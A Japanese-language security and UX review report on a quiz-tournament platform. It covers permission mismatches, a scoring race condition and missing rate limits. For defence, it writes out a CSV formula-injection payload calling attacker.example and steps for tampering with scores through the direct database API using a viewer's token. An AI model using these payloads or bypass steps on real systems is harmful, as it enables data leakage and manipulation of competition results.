# Q-Score Pro 総合レビューレポート

**対象**: https://q-score-pro.astro-root.com/ ／ リポジトリ ZIP (`q-score-pro-main`)
**レビュー観点**: シニアWebエンジニア／プロダクトデザイナー／UXリサーチャー／セキュリティエンジニア
**評価基準**: 個人開発・学生開発であることを考慮せず、実際にサービスとして公開・運用する場合の基準

**調査方法についての注記（重要）**: 本レビューは (a) リポジトリZIPの静的コード解析、(b) `web_fetch` によるサイトの未認証ページの取得、の2系統で行った。テストアカウントの提供がなく、また利用したブラウジングツールはJavaScriptを実行せず認証セッションも張れないため、**ログイン後のダッシュボード・大会作成・得点操作画面などの「実際の操作」は確認できていない**。該当箇所はすべて「コードから推測される問題」として明記し、Confidenceを適切に下げてある。未認証で確認できたのは `/`（`/login`にリダイレクト）と `/signup` のみ。

---

## 1. Executive Summary

Q-Score Proは、Next.js 16 (App Router) + Supabase (PostgreSQL/Auth/RLS/Realtime) で構築された、競技クイズ大会運営のための統合プラットフォームである。README上は「Phase 1（認証・大会・権限基盤）のみ完了」となっているが、実際のリポジトリには Phase 2〜8 相当（CMS・エントリー・参加者・ラウンド・ルールエンジン・得点イベント・監査ログ・カスタム表示レイアウト・OBS連携）がすべて実装されており、**README（引き継ぎドキュメント）と実装の間に大きな乖離がある**。これ自体が引き継ぎ・オンボーディングにおけるリスクである。

コード全体の設計品質は、個人開発にしては非常に高い。特に以下の設計判断は的確である。

- `entries`（応募） / `participants`（参加者） / `tournament_members`（運営スタッフ）を明確に別概念として分離
- 得点を「その場の数値」ではなく `score_events` という追記専用イベントログとして持ち、現在の得点・順位・Undoをすべて「イベントからの再計算」として実装（対障害性・監査性が高い設計）
- ロール×アクションの権限マトリクスをコード（`if/else`）ではなくデータテーブル（`src/lib/permissions/index.ts`）として持つ
- `getCurrentUser()` が常に `supabase.auth.getUser()` で再検証しており、キャッシュされたセッションを信頼しない実装になっている

一方で、**この設計の良さが実装の隅々まで一貫していない**という問題がある。もっとも重大なのは、大会運営本番で使われることが明示的に想定されている「得点操作画面（オペレーター画面）」において、**ロールモデル上SCORE_OPERATORに許可されているはずの操作が、Supabaseのrow level security（RLS）ポリシーの制約により実際にはOWNER/ADMIN以外では失敗する**というアプリケーション層とDB層の権限定義の不整合である（Issue #1）。加えて、`round_participants`・`score_events`への書き込みRLSが「大会スタッフなら誰でも書き込み可」と広く開けられており、役割ごとの制限がアプリケーション層（APIルート）にしか存在しないため、**閲覧専用のはずのVIEWERロールでもSupabase REST APIへの直接アクセスで得点を改ざんできてしまう**構造的な権限管理の穴もある（Issue #6）。競技の公正性を担保するツールとして、これは看過できない。

また、複数オペレーターによる同時得点操作（README・コードコメントの両方で明示的にサポート対象とされているユースケース）において、得点再計算処理 (`recomputeRoundParticipants`) が「読み取り→計算→全件上書き」という非トランザクショナルな実装になっており、同時押しに近いタイミングで2人のオペレーターが操作すると、後勝ちの上書きによって画面上のスコアが一時的または操作が止まるまで誤った値のまま表示され続けるレース条件がある（Issue #2）。得点イベントのログ自体（`score_events`）は失われないため復旧可能ではあるが、大会当日の一瞬の表示ミスが致命的になりうる用途を考えると重大度は高い。

セキュリティ面では、公開エントリーフォーム由来のCSVエクスポートにCSVインジェクション（数式インジェクション）の脆弱性があり（Issue #3）、また同エントリーフォームにレート制限・重複防止が一切ないため、匿名の第三者が無制限にデータを書き込める（コスト増・データ汚染のリスク、Issue #4）。スタッフ管理画面には招待機能しかなく、招待したスタッフを後から削除・降格する手段がUI上に存在しない（Issue #7）ため、運用開始後にミスや離脱者が出た場合にアクセスを取り消せない。

総じて、**コアとなるデータモデルと設計思想は優れているが、「本番の大会で複数の役割の人間が同時に触る」という、このサービスの存在意義そのものに関わる部分に具体的な欠陥が複数ある**状態である。本番投入前に「今すぐ直すもの」（後述ロードマップ）を解消することを強く推奨する。

---

## 2. 実地調査で確認した事実（未認証範囲のみ）

| 確認内容 | 結果 | 分類 |
|---|---|---|
| `https://q-score-pro.astro-root.com/` へのアクセス | 即座に `/login` へリダイレクト。サービス説明・機能紹介・ランディングページは一切存在しない | 実際に確認した事実 |
| ログインページの表示 | メールアドレス／パスワード／ログインボタン／新規登録リンクのみ。見出し以外に文言なし | 実際に確認した事実 |
| `/signup` の表示 | 表示名／メールアドレス／パスワード／作成ボタンのみ。パスワード要件・利用規約・プライバシーポリシーへの言及なし | 実際に確認した事実 |
| ダッシュボード、大会作成・編集、得点操作画面、OBS表示、モバイル表示、エラー時挙動、空データ時挙動 | **未確認**（認証が必要で、かつ利用ツールがJS実行・セッション確立に対応していないため） | 未確認（コードからの推測のみ） |

この制約のため、本レポートの個別Issueの多くは「コードレビューによる発見」であり、Confidenceフィールドで実際の再現有無を明示している。可能であれば、実際のテストアカウントでの操作確認（特にIssue #1, #2）を追加で行うことを強く推奨する。

---

## 3. Critical Issues

該当なし。

今回のコードレビューでは、即座にサービス全体を停止させる、または不可逆なデータ消失を引き起こす類の「Critical」相当の問題は確認できなかった。ただし後述のHigh Issue群（特に #1, #2, #6）は、いずれも「大会運営中に踏むと現場で致命的な混乱を招く」性質を持つため、優先度としてはCriticalに準じる扱いを推奨する。

---

## 4. High Priority Issues

### Issue 1: SCORE_OPERATORロールが得点操作画面で「次の問題へ」を実行できない（アプリ層とRLSの権限定義不整合）

**Title**: `PATCH /api/tournaments/[id]/rounds/[roundId]/question` がSCORE_OPERATORロールに許可されているが、対応するRLSポリシーはOWNER/ADMINのみを許可しており更新が失敗する

**Labels**: `security`, `backend`, `data-model`, `core-feature`, `priority: high`
**Priority**: High
**Confidence**: High（コード上で確定的に再現する不整合。実機での再現テストは未実施だが、ロジック上100%再現する）

**Description**

- 問題の概要:
  `src/lib/permissions/index.ts` の権限マトリクスでは、`tournament:operate_score` アクションは `OWNER`, `ADMIN`, `SCORE_OPERATOR` の3ロールに許可されている。得点操作画面 (`operator-screen.tsx`) の「次問題へ／前問題へ」ボタンは `PATCH /api/tournaments/[tournamentId]/rounds/[roundId]/question` を呼び出し、このAPIルートは `can(role, "tournament:operate_score")` のみをチェックして通過させる。
  しかしこのAPIルートの内部実装は `rounds` テーブルの `current_question_number` を直接 `UPDATE` しており、`rounds` テーブルのUPDATE用RLSポリシーは `supabase/migrations/0003_participants_rounds.sql` で定義された `rounds_update_admin` の一つのみで、これは `is_tournament_admin()`（=OWNER/ADMINのみ）を要求する。つまり **SCORE_OPERATORロールのユーザーがこのAPIを呼んでも、Supabase側のRLSに拒否されて更新は反映されない**。

- 再現手順（コード上の論理的再現。実機未検証）:
  1. あるユーザーをOWNER/ADMIN以外（例: `SCORE_OPERATOR`）として大会スタッフに追加する
  2. そのユーザーでログインし、得点操作画面 (`/tournaments/[id]/rounds/[roundId]/operate`) を開く
  3. 「次問題へ →」ボタン、またはキーボードショートカット `→`/`N` を押す
  4. `PATCH .../question` は `can()` チェックを通過し200が返るように見えるが、内部の `supabase.from("rounds").update(...).select().single()` はRLSにより対象行が0件になり、`.single()` がエラーを返す（`{error: ...}` を伴う500）

- 現在の挙動: APIレベルでは許可されている操作が、DBレベルで拒否され失敗する。しかもクライアント側の `moveQuestion()` 関数（`operator-screen.tsx`）は `fetch` のレスポンスを一切チェックしておらず、失敗時に何のエラー表示もフィードバックも出ない。オペレーターは「ボタンを押したのに問題番号が変わらない」という現象だけを見ることになり、原因が権限なのか通信なのか分からない。

- 期待される挙動: 権限マトリクスで許可されているロールは、実際にその操作を完遂できるべき。

- なぜ問題か: SCORE_OPERATORは、まさに「OWNER/ADMIN権限を渡さずに大会当日の得点操作だけを任せる」ために存在するロールである。このロールが得点操作画面の基本機能（進行）を使えないなら、ロール分割の意味がなく、結局全オペレーターにADMIN権限を配らざるを得なくなる。これは権限設計思想（最小権限の原則）そのものを崩す。

- 影響範囲: 得点操作画面全体（Phase 5の中核機能）。SCORE_OPERATORロールで運用しようとするすべての大会。

- 技術的な原因: `supabase/migrations/0003_participants_rounds.sql` の `rounds_update_admin` ポリシーが、Phase 5で追加された `current_question_number`（運営スタッフの日常操作フィールド）と、Phase 3由来の `name`/`advance_count`/`status`（管理者操作フィールド）を区別せずに一括りにUPDATE制御している。

- 修正方針:
  1. `rounds` テーブルに「問題番号の進行だけ」を許可する専用RLSポリシーを追加する（例: `is_tournament_member` かつ `has_tournament_role(..., ['OWNER','ADMIN','SCORE_OPERATOR'])` で、更新対象カラムを `current_question_number` のみに限定したい場合はPostgreSQLの列レベルGRANTと組み合わせるか、専用のRPC関数 `advance_question(round_id, direction)` を`security definer`で作り、APIルートはそのRPCを呼ぶ形にするのが安全）。
  2. あわせて、`operator-screen.tsx` の `moveQuestion`/`recordEvent`/`undo` はすべてfetchのレスポンスステータスを確認し、失敗時にはUIにエラー表示を出すよう修正する（現状は成功したふりをして `flash` メッセージを出してしまう）。

- テスト方法: SCORE_OPERATORロールのアカウントでE2Eテスト（Playwright等）を書き、「次問題へ」ボタン押下後に画面上の問題番号が実際に増加することを検証する。あわせて `tests/unit` にRLSポリシーの意図を記述したドキュメントテスト、または `supabase test` によるpgTAPテストを追加することを推奨。

---

### Issue 2: 得点再計算処理に競合状態（レース条件）があり、複数オペレーター同時操作で表示スコアが後勝ち上書きされうる

**Title**: `recomputeRoundParticipants` の read-modify-write がトランザクション化されておらず、同時得点操作で `round_participants` の表示値が不整合になる

**Labels**: `concurrency`, `data-model`, `backend`, `performance`, `priority: high`
**Priority**: High
**Confidence**: Medium（コードロジック上明確に存在するレース条件だが、実際のタイミング依存の再現テストは未実施）

**Description**

- 問題の概要:
  `POST /api/tournaments/[id]/rounds/[roundId]/events`（得点イベント記録）は、①イベントをINSERT → ②`recomputeRoundParticipants()` を呼び出し、③`score_events` を全件SELECTして純粋関数でスコアを再計算 → ④`round_participants` に対して計算結果を丸ごと `upsert` する、という4ステップを **単一のPostgresトランザクションではなく複数回の独立したHTTPリクエスト～DBラウンドトリップ** として実行している。

- 再現手順（コード上の論理的再現）:
  1. 早押しラウンドで、オペレーターAとオペレーターBが同時にログインして得点操作画面を開いている（マスタースペック上、明示的にサポートされる運用形態）
  2. ほぼ同時に、Aが参加者Xに「正解」、Bが参加者Yに「誤答」を記録する
  3. リクエストA: イベントX-CORRECTをINSERT → 全イベントをSELECT（この時点でBのイベントがまだcommitされていない）→ 「Xの正解のみ反映した状態」を計算 → `round_participants` をupsert
  4. リクエストB: イベントY-WRONGをINSERT → 全イベントをSELECT（この時点でAのイベントは既にcommit済み）→ 「XとYの両方を反映した状態」を計算 → `round_participants` をupsert
  5. ここでリクエストAのupsert（ステップ3、Xのみ反映した古い状態）が、リクエストBのupsert（ステップ4、両方反映した新しい状態）**より後にDBへ書き込まれた場合**、最終的な `round_participants` は「Yの誤答が反映されていない」状態で確定してしまう

- 現在の挙動: `score_events`（イベントログそのもの）は正しく両方記録されるため、データは失われない。しかし画面（オペレーター画面・OBS配信画面・公開順位表）が参照しているのは `round_participants` の集計値であり、この集計値が一時的、あるいは次のイベントが発生するまで恒久的に、実際より少ない得点/誤った順位を表示し続ける可能性がある。

- 期待される挙動: 同時に記録された全イベントが、最終的な集計値に漏れなく反映されること。

- なぜ問題か: 早押しクイズの得点表示は「その瞬間の正しさ」が価値のすべてであり、複数人運営という明示的なユースケースにおいて表示スコアが実態とズレるのは、システムの存在意義に直結する欠陥である。しかも症状が「たまに起きる」タイミング依存のバグであるため、本番で発生した場合の切り分けが極めて困難。

- 影響範囲: 得点操作画面、OBS配信画面、公開順位表（すべて `round_participants` を参照）。複数オペレーター運用時のみ顕在化。

- 技術的な原因: `src/lib/rules/apply-round-events.ts` の `recomputeRoundParticipants` が、他リクエストとの排他制御（Postgresのアドバイザリロック、`SELECT ... FOR UPDATE`、あるいはSERIALIZABLE分離レベルでのトランザクション）を一切行っていない。

- 修正方針:
  1. 最も確実なのは、INSERT・SELECT・UPSERTの一連の処理を **1つのPostgres関数（RPC, `security definer`）にまとめ、関数内で `pg_advisory_xact_lock(hashtext(round_id::text))` のようなラウンド単位のアドバイザリロックを取得してから再計算する**こと。これによりラウンド単位で処理が直列化され、レース条件が構造的に解消する。
  2. 代替案として、`round_participants` に `version` (楽観的ロック用のカウンタ) を持たせ、upsert時に「読み取った時点のversionと一致する場合のみ更新」という条件を付け、失敗した場合はリトライする方式もあるが、実装・テストコストはRPC化より高い。
  3応急処置として、フロントエンドから同一ラウンドへの書き込みリクエストを直列化する（mutex的なキュー）ことも検討しうるが、複数ブラウザ・複数端末をまたぐ以上、根本解決にはならない。

- テスト方法: `Promise.all` で同一ラウンドに対する複数の `POST /events` を並行実行する統合テストを書き、最終的な `round_participants` が全イベントを反映していることをアサートする。

---

### Issue 3: 公開エントリーフォームのCSVエクスポートにCSV/数式インジェクション脆弱性がある

**Title**: `entries/export` のCSV生成がExcel/Sheetsの数式解釈文字（`=`, `+`, `-`, `@`）をエスケープしておらず、CSVインジェクションが可能

**Labels**: `security`, `backend`, `priority: high`
**Priority**: High
**Confidence**: High（コードから確定。既知の脆弱性クラス CWE-1236 に完全に一致）

**Description**

- 問題の概要:
  `src/app/api/tournaments/[tournamentId]/entries/export/route.ts` の `csvEscape()` 関数は、値の中にダブルクォート・カンマ・改行が含まれる場合のみクォートで囲むが、セルの先頭が `=`, `+`, `-`, `@` で始まる場合の対処を一切行っていない。`entries` テーブルの `display_name`, `affiliation`, `answers`（自由記述の応募項目）は、**認証不要の公開エントリーフォームから任意の文字列として第三者が入力できる**。

- 再現手順:
  1. 大会が `REGISTRATION_OPEN` 状態のとき、`/t/[slug]/entry` から誰でもエントリーできる（認証不要）
  2. 表示名や自由記述欄に `=HYPERLINK("http://attacker.example/leak?x="&A1&A2,"クリックしてください")` のような文字列を入力して応募する
  3. 大会運営者（`manage_entries` 権限を持つスタッフ）が「エントリー一覧をCSVエクスポート」機能でこのデータを含むCSVをダウンロードする
  4. ダウンロードされたCSVをExcel/Google Sheetsで開くと、当該セルが数式として評価され、悪意あるリンクの表示・クリック誘導や、環境によっては外部データ参照によるデータ漏えいの起点になりうる

- 現在の挙動: 応募者が入力した文字列がそのままCSVのセル値として出力される。
- 期待される挙動: セルの先頭文字が `=`, `+`, `-`, `@`, タブ、改行のいずれかである場合、先頭にシングルクォート `'` を付与するなどして文字列として強制解釈させる（OWASP推奨のCSV Injection対策）。
- なぜ問題か: 攻撃者は大会に「応募する」という、システムが意図的に誰にでも許可している唯一の操作だけで攻撃を仕掛けられる。標的は大会運営者（信頼されたスタッフ）であり、フィッシングや情報窃取のエントリーポイントになりうる。
- 影響範囲: `entries/export`。同種のパターンが将来他のCSV出力機能に追加された場合も同様のリスクを持つため、共通ユーティリティ化が望ましい。
- 技術的な原因: `csvEscape()` が引用符/区切り文字のみをエスケープ対象とし、スプレッドシートソフトの数式解釈という「CSVの仕様外」の挙動を考慮していない。
- 修正方針:
  ```ts
  function csvEscape(value: unknown): string {
    let s = value === null || value === undefined ? "" : String(value);
    if (/^[=+\-@\t\r]/.test(s)) {
      s = `'${s}`; // 数式として解釈されないよう先頭にシングルクォートを付与
    }
    if (/[",\n]/.test(s)) {
      return `"${s.replace(/"/g, '""')}"`;
    }
    return s;
  }
  ```
- テスト方法: `display_name` に `=1+1` や `@SUM(A1:A9)` を含むエントリーを作成し、エクスポートしたCSVの当該セルが `'=1+1` のように先頭にクォートが付いた文字列として出力されることを確認する単体テストを追加する。

---

### Issue 4: 公開エントリー送信APIにレート制限・重複防止・スパム対策が一切ない

**Title**: `POST /api/tournaments/[id]/entries` が無制限・無認証で呼び出せ、同一メールアドレスでの重複応募も防げない

**Labels**: `security`, `backend`, `cost`, `data-model`, `priority: high`
**Priority**: High
**Confidence**: High（コードから確定。実際のスパム攻撃の再現は行っていない）

**Description**

- 問題の概要: エントリー登録API（認証不要、意図的に公開）には、レート制限・CAPTCHA・IPベースの制御・同一メールアドレスでの重複投稿防止のいずれも実装されていない。DB上も `entries_tournament_email_idx` は非ユニークインデックスであり、重複を防ぐ制約ではなく検索用インデックスに過ぎない。
- 再現手順: `curl` やスクリプトで `POST /api/tournaments/{id}/entries` に妥当なJSONボディ（`displayName`, `email`, 必須カスタム項目）を送り続けるだけで、`REGISTRATION_OPEN` 状態の任意の大会に無制限にエントリーを挿入できる。
- 現在の挙動: 何百・何千件でも即座に受け付けられ、成功レスポンス（201）が返る。
- 期待される挙動: 短時間の連続投稿を制限する、同一メールアドレスからの重複投稿を検知して警告または拒否する、機械的な連続投稿を検知する（reCAPTCHA/hCaptcha、あるいは最低限の時間ベースのレート制限）などの対策があるべき。
- なぜ問題か:
  1. **コスト**: Supabase無料枠は行数・帯域に制限があり、スパムによる大量INSERTは無料枠を容易に食い潰しうる（README冒頭の「無料・統合プラットフォーム」というコンセプトそのものに影響）。
  2. **データ整合性**: 大会運営者は「エントリー一覧から参加者を作成する」というスクリーニングフローを想定しているが、重複・スパムが大量に混在すると、実運用でこのスクリーニング作業自体が破綻する。
  3. **可用性**: エントリー受付期間中（大会本番に最も近く、最も止められては困るタイミング）が最も攻撃対象になりやすい。
- 影響範囲: 全ての公開エントリーフォーム、Supabaseの利用コスト全体。
- 技術的な原因: APIルート・Next.js Middleware (`proxy.ts`) のいずれにもレート制限の仕組みがなく、Supabase側のRLSも「`REGISTRATION_OPEN`状態かどうか」しかチェックしていない。
- 修正方針:
  1. `(tournament_id, email)` に部分ユニーク制約（例: `status = 'SUBMITTED'` の行のみ対象）を追加し、重複応募をアプリ層で検知して「既に応募済みです」と案内する。
  2. Next.jsのMiddleware、またはVercel Edge Config等を用いたIPベースの簡易レート制限（例: 同一IPから1分間に3回まで）を導入する。
  3. 将来的にはCloudflare TurnstileなどのCAPTCHAをエントリーフォームに組み込むことを検討する。
- テスト方法: 同一メールアドレスで2回連続応募し、2回目が拒否される、または警告付きで受理されることを確認する統合テスト。加えて、短時間に大量リクエストを送るnegativeテストでレート制限が機能することを確認する。

---

### Issue 5: 大会スタッフの削除・ロール変更機能が存在せず、招待の取り消しができない

**Title**: スタッフ管理画面 (`members/page.tsx`) に招待機能しかなく、削除・ロール変更のUI/APIが未実装

**Labels**: `admin`, `core-feature`, `security`, `priority: high`
**Priority**: High
**Confidence**: High（該当UI・APIルートがリポジトリ内に存在しないことを確認済み）

**Description**

- 問題の概要: `src/app/(dashboard)/tournaments/[tournamentId]/members/page.tsx` はスタッフの一覧表示と招待フォーム (`invite-form.tsx`) のみを持ち、既存メンバーの削除・ロール変更に対応するUIが存在しない。対応するAPIルート（例: `members/[memberId]/route.ts`）自体もリポジトリに存在せず、DBの `tournament_members_delete_admin` / `tournament_members_update_admin` RLSポリシーは用意されているにもかかわらず、それを呼び出すアプリケーションコードが一切ない。
- 現在の挙動: 一度スタッフとして招待すると、Supabaseダッシュボードを直接操作する以外にアクセスを取り消す手段がない。
- 期待される挙動: OWNER/ADMINが、メンバー一覧からロールの変更・削除（アクセス取り消し）を行えること。
- なぜ問題か: 競技大会運営という性質上、「本番当日だけ手伝ってもらうボランティアスタッフ」「途中で運営から抜けた人」「誤って強い権限（ADMIN）を付与してしまった人」のアクセスを速やかに取り消せることはセキュリティ・運用の両面で必須である。現状はSupabaseの管理画面に直接アクセスできる人（＝開発者本人相当）しか対応できず、実運用上は「一度招待したら退会するまで永久にアクセスが残る」に等しい。
- 影響範囲: `tournament_members` に関わる全ての運用（スタッフの入れ替わりが起きるすべての大会）。
- 技術的な原因: 機能として未実装（DBスキーマとRLSは既に用意されているため、実装コスト自体は低い）。
- 修正方針: `DELETE /api/tournaments/[tournamentId]/members/[memberId]`（`manage_staff` 権限必須、かつ「OWNERは削除不可」「自分自身をOWNER以外が削除する場合の確認」などのガードを追加）と `PATCH` によるロール変更APIを実装し、メンバー一覧UIに削除・変更ボタンを追加する。あわせて、OWNER自身の削除・降格を防ぐガード（現状「OWNERは`tournaments.owner_id`と`tournament_members`の役割が別々に管理されているため、ADMIN操作でOWNERのロール行を誤って書き換えられないか」も実装時に確認すべき）。
- テスト方法: ADMINが他のADMIN/一般ロールを削除できること、OWNERを削除しようとした場合に拒否されることを確認する単体・統合テスト。

---

### Issue 6: `round_participants` / `score_events` の書き込みRLSがロール粒度を持たず、閲覧専用スタッフでもSupabase直叩きで得点改ざんが可能

**Title**: DBレベルのRLSは「大会スタッフかどうか」しか判定しておらず、`can()` によるロール別権限制御はアプリ層（Next.js APIルート）のみに存在する

**Labels**: `security`, `backend`, `admin`, `priority: high`
**Priority**: High
**Confidence**: High（RLSポリシー定義から確定。実際にSupabase REST APIへの直接攻撃リクエストの送信による実証は行っていない）

**Description**

- 問題の概要:
  `supabase/migrations/0003_participants_rounds.sql`（`round_participants_insert_staff` / `round_participants_update_staff`）および `0005_score_events.sql`（`score_events_insert_staff` / `score_events_update_staff`）のRLSポリシーは、いずれも「その大会の `tournament_members` に何らかの形で属しているか（`is_tournament_member`）」だけを条件にしており、`OWNER`/`ADMIN`/`SCORE_OPERATOR`/`GRADER` と `VIEWER`/`VENUE_STAFF`/`QUESTION_MANAGER`/`STREAM_OPERATOR` の区別を一切していない。マイグレーションのコメント自身が「役割ごとの細かい制御はAPIルートの`can()`に委ねる」と明記している。

  Supabaseの設計上、`NEXT_PUBLIC_SUPABASE_ANON_KEY` はクライアントに公開される値であり、ログイン中のユーザーのJWT（アクセストークン）もブラウザから取得可能である。つまり、閲覧専用権限しか持たないはずの `VIEWER` ロールのユーザーであっても、**Q-Score ProのフロントエンドUIを経由せず、自分のJWTと公開anonキーを使って直接Supabase REST API（PostgREST）を呼び出せば**、`score_events` へ任意の `MANUAL_ADJUST`（得点の直接加減算）イベントを挿入したり、`round_participants` の `score`/`rank`/`won` 列を直接書き換えたりできてしまう。これはNext.jsのAPIルートも `can()` チェックも一切経由しないため、アプリケーション側の権限制御が完全にバイパスされる。

- 再現手順（論理的に確定。実機での攻撃リクエスト送信は本レビューでは実施していない）:
  1. `VIEWER` ロールとしてある大会に招待されたユーザーでログインする（閲覧専用アクセスとして意図的に付与されたロール）
  2. ブラウザの開発者ツールでSupabaseセッションのアクセストークン（JWT）を取得する
  3. `https://<project>.supabase.co/rest/v1/score_events` に対し、そのJWTと公開anonキーを使って直接 `POST`（`event_type: "MANUAL_ADJUST", value: 9999` など）を送信する
  4. RLSは `is_tournament_member` のみをチェックしているため挿入が成功し、直後の得点再計算（もし何らかの形でトリガーされる場合）またはそのまま `round_participants` を直接 `PATCH` することで、得点表示画面・公開順位表の数値が改ざんされる

- 現在の挙動: ロール粒度の権限制御がアプリ層のみに存在し、DB層はバイパス可能。
- 期待される挙動: 「閲覧専用ロールのユーザーは、経路によらず絶対に得点を書き換えられない」ことがDBレベルで保証されているべき（README自身が「RLSが最終防衛線」「新しいテーブルを追加する際は必ずRLSを有効化」と明記しており、この方針と実態が矛盾している）。
- なぜ問題か: 得点操作という、このサービスの信頼性の根幹に関わる操作について、「アプリのUIを使わなければ権限チェックが存在しない」状態は、競技の公正性を扱うツールとして致命的なリスクである。悪意がなくとも、招待されたスタッフが好奇心でSupabaseの存在に気づき、意図せず操作してしまうケースも現実的にありうる。
- 影響範囲: `round_participants`, `score_events` の書き込み全般。将来同様のパターンで追加されるテーブルにも同じ穴が生まれるリスクがある（設計パターンとして踏襲されてしまう懸念）。
- 技術的な原因: RLSポリシー設計が「大会単位の分離」のみを担保し、「ロール単位の権限」を意図的にアプリ層に委譲する設計になっている（README・マイグレーションコメントに明記された既知のトレードオフ）。
- 修正方針:
  1. `has_tournament_role()` ヘルパー関数（既に`0001_init.sql`に存在）を使い、`round_participants`/`score_events` のINSERT/UPDATEポリシーを `has_tournament_role(tournament_id, ARRAY['OWNER','ADMIN','SCORE_OPERATOR','GRADER'])` のように役割を限定する形に書き換える。
  2. `GRADER`は`round_participants`のみ、`SCORE_OPERATOR`は`score_events`と`rounds.current_question_number`のみ、といった操作対象の違いも反映できるよう、ポリシーをテーブルごと・カラムごとに分けて設計し直す。
  3. 少なくとも、README中の「RLSは最終防衛線」という方針を守るなら、`can()`のロジックとRLSポリシーが1対1対応するようテストで担保する仕組み（両者を同じ`ROLE_ACTIONS`データから生成する、あるいはRLSポリシーのテストをpgTAPで書く）を導入すべき。
- テスト方法: 各ロールのJWTを用いて直接PostgREST APIを叩き、権限外の書き込みがRLSレベルで拒否されることを確認するインテグレーションテスト（Supabase CLIのローカル環境で再現可能）。

---

## 5. Medium / Low Priority Issues

### Issue 7: `entry_form_fields` の公開SELECTポリシーが `using (true)` で、DRAFT大会のエントリーフォーム構造も第三者に閲覧可能

**Labels**: `security`, `backend`, `priority: medium`
**Priority**: Medium
**Confidence**: High（SQLから確定）

**Description**: `supabase/migrations/0002_cms_entries.sql` の `entry_form_fields_select_public` ポリシーは `using (true)` であり、大会のステータス（`DRAFT`を含む）を一切条件にしていない。他の全テーブル（`tournaments`, `announcements`, `schedule_items` 等）は「`DRAFT`以外」を条件にしているのと対照的。これにより、まだ告知されていない準備中の大会について、エントリーフォームの項目名・選択肢（`options`）などの構造情報が、大会IDさえ推測・取得できれば誰でも閲覧できてしまう。実害は限定的（応募データそのものではなく、フォームの「形」のみ）だが、他ポリシーとの一貫性のなさは設計上の見落としであり、将来同様の見落としを誘発しやすい。
**修正方針**: 他のPhase 2テーブルと同様に `t.status <> 'DRAFT'` 条件を追加する。

---

### Issue 8: `rounds`テーブルのUPDATE権限が一枚岩で、GRADER/SCORE_OPERATORが必要とする範囲を超えて制限が強すぎる／逆に不足している

**Labels**: `data-model`, `refactor`, `priority: medium`
**Priority**: Medium
**Confidence**: High（Issue #1の根本原因と同一だが、設計上の一般的課題として独立して記載）

**Description**: Issue #1で指摘した不整合は、`rounds`テーブルが「管理者だけが変更してよい設定（名前・カットライン人数・ステータス・ルール設定）」と「現場のオペレーターが頻繁に更新する状態（現在の問題番号）」を同一テーブル・同一RLSポリシーで扱っていることに起因する。今後、例えば「一時停止理由のメモ」のような現場向けフィールドが追加された場合も同じ問題が再発する。**修正方針**: 現在の問題番号のような高頻度・低権限の状態は、別テーブル（例: `round_live_state`）に切り出し、ロール別に適切なRLSを設定する設計変更を推奨する。

---

### Issue 9: 大会ステータスに `PUBLISHED` からの復帰・`CANCELLED`（中止）状態がなく、公開後の訂正や中止処理ができない

**Labels**: `data-model`, `enhancement`, `priority: medium`
**Priority**: Medium
**Confidence**: High（`src/lib/tournament/status.ts` から確定）

**Description**: `ALLOWED_TRANSITIONS`では`PUBLISHED`から遷移できる先が存在しない（`[]`）。結果公開後に誤りが見つかっても、ステータスを戻して修正・再公開する手段がアプリ上にない。また、荒天・災害等でイベント自体を中止する場合の`CANCELLED`相当のステータスも存在せず、`DRAFT`に戻すことも`REGISTRATION_OPEN`からしかできない（`RUNNING`以降は前進のみ）。**修正方針**: `PUBLISHED -> RUNNING`（訂正のための巻き戻し、監査ログに記録必須）、および任意の状態から`CANCELLED`への遷移を許可する設計に拡張する。

---

### Issue 10: スタッフ招待APIが大会横断でのメールアドレス存在確認（ユーザー列挙）に使える

**Labels**: `security`, `priority: low`
**Priority**: Low
**Confidence**: Medium（コード上のロジックは確定だが、実害は「manage_staff権限を持つ攻撃者」に限定されるため低リスク）

**Description**: `POST /api/tournaments/[id]/members` は、対象メールアドレスがQ-Score Proに登録されているかどうかで `404 user_not_found` / `201` / `409（既にメンバー）` を出し分ける。`manage_staff`権限（自分がADMIN以上の大会を1つでも持っていれば取得可能）さえあれば、任意のメールアドレスがシステム全体で登録済みかどうかを判定できてしまう。**修正方針**: 存在有無にかかわらず同一のレスポンス（例: 「招待を送信しました（対象が未登録の場合は何も起きません）」）を返し、実際の招待成立は別途非同期に処理する設計に変更するか、少なくともレスポンスを統一する。

---

### Issue 11: ルートページに製品説明のないランディングページが存在せず、SEO・第一印象に悪影響

**Labels**: `marketing-mismatch`, `ui`, `seo`, `priority: medium`
**Priority**: Medium
**Confidence**: High（ライブサイト・コード両方で確認済み）

**Description**: `src/app/page.tsx` は認証状態を見て `/dashboard` か `/login` に即リダイレクトするのみで、製品の説明・機能一覧・利用例・信頼性を示す情報が一切ない静的な公開ページが存在しない。README上「クイズ大会を運営するための無料・統合プラットフォーム」を謳っているにもかかわらず、初めて訪れた人（例えば検索エンジンや紹介リンク経由）はいきなりログインフォームを見せられ、何のサービスかも分からないままアカウント作成を迫られる。検索エンジンにインデックスされるコンテンツも存在しないため、SEO上も不利。**修正方針**: `/` に静的なマーケティングページ（サービス概要・機能一覧・スクリーンショット・CTA）を用意し、ログイン済みユーザーのみ`/dashboard`へ誘導する。

---

### Issue 12: `rules_content`/`notes` はMarkdown想定と明記されているが実際はプレーンテキストとしてしか描画されない

**Labels**: `ui`, `marketing-mismatch`, `enhancement`, `priority: low`
**Priority**: Low
**Confidence**: High（コードから確定）

**Description**: `supabase/migrations/0002_cms_entries.sql` のコメントに「ルール(Markdown想定)」とあるが、`src/app/t/[slug]/page.tsx` では `whitespace-pre-wrap` のプレーンテキストとして描画しており、Markdown構文（見出し・リスト・強調等）は一切パースされない。運営者が `**重要**` のように書いても、公開ページ上には記号がそのまま表示される。**修正方針**: `react-markdown` 等を導入するか、Markdownを謳うのをやめてプレーンテキストであることをCMS編集画面で明示する（後者のほうが低コスト）。

---

### Issue 13: セキュリティヘッダー（CSP・X-Frame-Options等）が未設定

**Labels**: `security`, `priority: low`
**Priority**: Low
**Confidence**: High（`next.config.ts`から確定。実際の攻撃シナリオの実証は行っていない）

**Description**: `next.config.ts` はデフォルト設定のままで、CSP・`X-Frame-Options`/`frame-ancestors`・`Referrer-Policy`等が一切設定されていない。特にダッシュボード（スタッフ用管理画面）がクリックジャッキング対策なしに配信されている点は、多要素の防御層（defense in depth）が期待される管理画面としては弱い。**修正方針**: `next.config.ts` の `headers()` で最低限 `X-Frame-Options: DENY`、`Referrer-Policy: strict-origin-when-cross-origin`、可能であればCSPを追加する。

---

